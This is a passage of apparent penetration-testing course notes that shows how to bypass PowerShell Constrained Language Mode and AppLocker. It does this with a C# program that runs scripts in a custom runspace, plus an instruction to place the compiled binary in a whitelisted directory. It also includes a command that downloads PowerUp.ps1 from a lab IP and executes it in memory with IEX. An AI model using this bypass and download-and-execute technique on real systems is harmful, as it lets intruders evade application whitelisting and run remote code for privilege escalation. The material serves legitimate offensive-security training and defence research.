we could code a C# application that creates a custom PowerShell runspace and
executes our script inside it.

```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
	class Program
	{
		static void Main(string[] args)
		{
			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();
			
			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;
			
			String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-		File -FilePath C:\\Tools\\test.txt";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
		}
	}
	
}
```

Unfortunately, Visual Studio can not locate System.Management.Automation.Runspaces, to resolve this, we must manually add the assembly reference. First we’ll right-click the References folder in the Solution Explorer and select Add Reference…. In most cases, the reference can be found in existing assemblies, but in this particular case, we’ll need to specify a file location
instead.

To do this, we’ll select the Browse… button at the bottom of the window and navigate to the `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35` folder where we will select System.Management.Automation.dll.


Copy the compiled binary to whitelisted directory if blocked by applocker and execute!

We can run any powershell command, such as download additional script with:

```
String cmd = "(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.120/PowerUp.ps1') | IEX;Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";

```

